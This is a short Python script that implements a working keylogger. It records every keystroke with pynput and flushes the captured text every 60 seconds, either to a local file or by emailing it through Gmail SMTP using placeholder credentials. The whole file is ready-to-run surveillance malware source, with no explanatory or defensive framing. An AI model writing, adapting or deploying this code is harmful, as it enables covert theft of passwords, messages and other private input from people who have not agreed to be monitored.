from pynput.keyboard import Key, Listener
import smtplib
from threading import Timer
from datetime import date, datetime
import atexit

EMAIL_ADDRESS = "fakeemail@gmail.com"
EMAIL_PASSWORD = "fakepassword"
SEND_REPORT_EVERY = 60

class Keylogger:

    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.log = ""
        self.report_method = report_method
        
        if report_method == "email":
            self.server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            self.server.starttls()
            self.server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def save(self):
        if len(self.log) > 0:
            if self.report_method == "email":
                self.server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, self.log)
            elif self.report_method == "local":
                with open(str(datetime.now()) + "log.txt", "w") as file:
                    file.write(self.log)
            self.log = ""
    
    def report(self):

        self.save()
        
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def on_press(self, key):
        try:
            self.log += '{0}'.format(key.char)
          
        except AttributeError:
            if key == Key.backspace:
                self.log = self.log[:-1]
            elif key == Key.space:
                self.log += " "
            else:
                self.log += " {0} ".format(key)

    def start(self):
        with Listener(on_press=self.on_press) as listener:
            self.report()
            listener.join()

if __name__ == "__main__":
    logger = Keylogger(SEND_REPORT_EVERY, "local")
    atexit.register(logger.save)
    logger.start()



    
